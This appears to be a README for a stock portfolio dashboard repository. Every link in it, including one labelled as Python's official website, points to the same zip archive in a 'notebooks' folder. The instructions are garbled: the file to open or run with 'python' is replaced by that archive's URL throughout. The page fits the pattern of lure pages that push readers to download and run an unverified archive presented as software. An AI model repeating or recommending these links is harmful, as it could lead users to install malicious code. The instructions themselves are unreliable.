...
[![Download Stock Portfolio Dashboard](https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip)
...
1. **Download the Application**: You can download the latest version of the stock-portfolio-dashboard by visiting our Releases page:
   [Download Link](https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip).
...
3. **Install Dependencies**: To run this application, you need Python installed on your computer. If you don’t have Python, you can download it from [Python's official website](https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip). After installing Python, open a command prompt or terminal and run the following command to install the required libraries:
   ```
   pip install matplotlib pandas scipy yfinance
   ```

4. **Open the Dashboard**: Navigate to the folder where you extracted the files. Look for the file named `https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip`. Double-click it to open the dashboard. This will launch the application where you can start analyzing your portfolio.
...
To download the application, visit this link: [Download Link](https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip). You will find the latest version available. Click on it to start the download process.
...
1. **Launch the Application**: Ensure your Python dependencies are installed. Open your command prompt or terminal, and navigate to the folder containing `https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip`.
   
2. **Run the Application**: Type the command below and press Enter:
   ```
   python https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip
   ```
...
- **Application Not Opening**: If the application does not open, check that you're in the correct directory where `https://raw.githubusercontent.com/Bilal996999/stock-portfolio-dashboard/main/notebooks/stock-portfolio-dashboard-v2.1.zip` is located.
